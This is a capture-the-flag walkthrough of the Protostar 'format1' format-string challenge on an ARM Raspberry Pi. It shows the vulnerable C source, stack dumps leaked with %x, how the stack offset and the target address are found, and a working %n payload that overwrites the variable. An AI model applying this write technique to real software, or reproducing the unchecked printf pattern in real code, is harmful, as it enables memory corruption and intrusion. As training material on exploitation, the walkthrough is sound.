## Protostar ARM format1

#### Source Code

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void vuln(char *string)
{
  printf(string);

  if(target) {
      printf("you have modified the target :)\n");
  }
}

int main(int argc, char **argv)
{
  vuln(argv[1]);
}

```
#### _Let's start_


Running the program we can see that it prints our input (given as argument).

```code
pi@raspberrypi:~/protostar/format/format1 $ ./format1 aaaa
aaaa
```

According with the article we can try to run the program and understand if it's possible to exploit it due to a format string vulnerability.

```code
pi@raspberrypi:~/protostar/format/format1 $ ./format1 %s
��~��~pi@raspberrypi:~/protostar/format/format1 $ ./format1 %x
7efff5d4pi@raspberrypi:~/protostar/format/format1 $ ./format1 %x%x
7efff5c47efff5d0pi@raspberrypi:~/protostar/format/format1 $ ./format1 %x%x%x
7efff5c47efff5d07efff71api@raspberrypi:~/protostar/format/format1 $ ./format1 %x.%x.%x
7efff5c4.7efff5d0.7efff718pi@raspberrypi:~/protostar/format/format1 $ ./format1 %x.%x.%x.%x
7efff5c4.7efff5d0.7efff715.10c8cpi@raspberrypi:~/protostar/format/format1 $
```

As we can see, we are able to read values contained into the memory. But as we can read values from the memory, we are also able to write values in memory.
We are pretty sure that the program is vulnerable and an idea to solve this challenge will be the follow:  

1. Find at which offset our input (AAAA) is located into the stack
2. Replace our input (AAAA) with the address of the variable `target` in order to overwrite its value

To find at which offset our input is located we will input a string like 'AAAA' and the we will read the values in the stack to find the offset of its hex representation.

```code
pi@raspberrypi:~/protostar/format/format1 $ ./format1 `python -c "print 'AAAA' +'%08x.'*200"`
AAAA7efff1e4.7efff1f0.7efff334.00010c8c.7efff334.7efff0a4.00010578.7efff1e4.00000002.00000000.000107bc.00000000.00000002.7efff1e4.00010550.059fa726.7b61500e.00010c8c.00010198.01010680.00010198.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.000103fc.00010d2c.00000000.7efff1e4.7efff32a.7efff334.00000000.7efff721.7efff731.7efff748.7efff75c.7efff774.7efff783.7efff7a9.7efff7b4.7efff7c9.7efff7d7.7efff7e8.7efff7fd.7efffddf.7efffe0f.7efffe26.7efffe3a.7efffe58.7efffe60.7efffe68.7efffe81.7efffe9c.7efffeaf.7efffece.7efffeee.7effff02.7effff74.7effff86.7effff99.7effffb0.7effffc5.7effffe6.00000000.00000021.76fff000.00000010.003fb0d6.00000006.00001000.00000011.00000064.00000003.00010034.00000004.00000020.00000005.00000009.00000007.00000000.00000008.00000000.00000009.000103d0.0000000b.000003e8.0000000c.000003e8.0000000d.000003e8.0000000e.000003e8.00000017.00000000.00000019.7efff316.0000001a.00000010.0000001f.7efffff2.0000000f.7efff326.00000000.00000000.00000000.bdcf0000.578e4c0d.79cf7b60.0d03d22b.3776959d.2f2e006c.6d726f66.00317461.41414141.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.252e7838.2e783830.
```

We can see in the last few lines our value `41414141`  and to find the offset we can count it manually or decreasing by ten for example the printed values.

```code
pi@raspberrypi:~/protostar/format/format1 $ ./format1 `python -c "print 'AAAA' +'%08x.'*190"`
AAAA7efff214.7efff220.7efff366.00010c8c.7efff366.7efff0d4.00010578.7efff214.00000002.00000000.000107bc.00000000.00000002.7efff214.00010550.da69188c.a497efd4.00010c8c.00010198.01010680.00010198.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.000103fc.00010d2c.00000000.7efff214.7efff35c.7efff366.00000000.7efff721.7efff731.7efff748.7efff75c.7efff774.7efff783.7efff7a9.7efff7b4.7efff7c9.7efff7d7.7efff7e8.7efff7fd.7efffddf.7efffe0f.7efffe26.7efffe3a.7efffe58.7efffe60.7efffe68.7efffe81.7efffe9c.7efffeaf.7efffece.7efffeee.7effff02.7effff74.7effff86.7effff99.7effffb0.7effffc5.7effffe6.00000000.00000021.76fff000.00000010.003fb0d6.00000006.00001000.00000011.00000064.00000003.00010034.00000004.00000020.00000005.00000009.00000007.00000000.00000008.00000000.00000009.000103d0.0000000b.000003e8.0000000c.000003e8.0000000d.000003e8.0000000e.000003e8.00000017.00000000.00000019.7efff348.0000001a.00000010.0000001f.7efffff2.0000000f.7efff358.00000000.00000000.00000000.00000000.710992b7.a496e854.6045d691.cc188a96.006c3776.6f662f2e.74616d72.41410031.30254141.252e7838.2e783830.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.
```

```code
pi@raspberrypi:~/protostar/format/format1 $ ./format1 `python -c "print 'AAAA' +'%08x.'*180"`
AAAA7efff244.7efff250.7efff398.00010c8c.7efff398.7efff104.00010578.7efff244.00000002.00000000.000107bc.00000000.00000002.7efff244.00010550.dc81ea92.a27f1c1a.00010c8c.00010198.01010680.00010198.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.000103fc.00010d2c.00000000.7efff244.7efff38e.7efff398.00000000.7efff721.7efff731.7efff748.7efff75c.7efff774.7efff783.7efff7a9.7efff7b4.7efff7c9.7efff7d7.7efff7e8.7efff7fd.7efffddf.7efffe0f.7efffe26.7efffe3a.7efffe58.7efffe60.7efffe68.7efffe81.7efffe9c.7efffeaf.7efffece.7efffeee.7effff02.7effff74.7effff86.7effff99.7effffb0.7effffc5.7effffe6.00000000.00000021.76fff000.00000010.003fb0d6.00000006.00001000.00000011.00000064.00000003.00010034.00000004.00000020.00000005.00000009.00000007.00000000.00000008.00000000.00000009.000103d0.0000000b.000003e8.0000000c.000003e8.0000000d.000003e8.0000000e.000003e8.00000017.00000000.00000019.7efff37a.0000001a.00000010.0000001f.7efffff2.0000000f.7efff38a.00000000.00000000.00000000.00000000.5b440000.1b9ae73c.daa0a27e.8d31c167.37766b5c.2f2e006c.6d726f66.00317461.41414141.78383025.3830252e.30252e78.252e7838.
```

Now, it's pretty easy to find our offset which is `174`  
Let's find out the address of the `target` variable using `objdump`

```code
pi@raspberrypi:~/protostar/format/format1 $ objdump -t format1 | grep target
01010898 g     O .bss	00000004 target
```

As explained in the article, we can use the value `%n` to overwrite a memory location using the `printf()`. We will replace our last `%08x` with `%n` and the value `AAAA` will be replaced by the address of the variable to change. By this way, we will be able to change the value of our variable.

Let's try
```code
pi@raspberrypi:~/protostar/format/format1 $ ./format1  "`python -c "print '\x98\x08\x01\x01'+'%174x' + '%n'"`"
7efff264 7efff270 7efff3b4 00010c8c 7efff3b4 7efff124 00010578 7efff264 00000002 00000000 000107bc 00000000 00000002 7efff264 00010550 dc003c6d a2fecac5 00010c8c 00010198 01010680 00010198 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 000103fc 00010d2c 00000000 7efff264 7efff3aa 7efff3b4 00000000 7efff721 7efff731 7efff748 7efff75c 7efff774 7efff783 7efff7a9 7efff7b4 7efff7c9 7efff7d7 7efff7e8 7efff7fd 7efffddf 7efffe0f 7efffe26 7efffe3a 7efffe58 7efffe60 7efffe68 7efffe81 7efffe9c 7efffeaf 7efffece 7efffeee 7effff02 7effff74 7effff86 7effff99 7effffb0 7effffc5 7effffe6 00000000 00000021 76fff000 00000010 003fb0d6 00000006 00001000 00000011 00000064 00000003 00010034 00000004 00000020 00000005 00000009 00000007 00000000 00000008 00000000 00000009 000103d0 0000000b 000003e8 0000000c 000003e8 0000000d 000003e8 0000000e 000003e8 00000017 00000000 00000019 7efff396 0000001a 00000010 0000001f 7efffff2 0000000f 7efff3a6 00000000 00000000 00000000 fb1e0000 cd45e5af 7914a2ff fe025275 3776a8b8 2f2e006c 6d726f66 00317461 you have modified the target :)
```

We changed the value of the variable `target`

__*Done :)*__
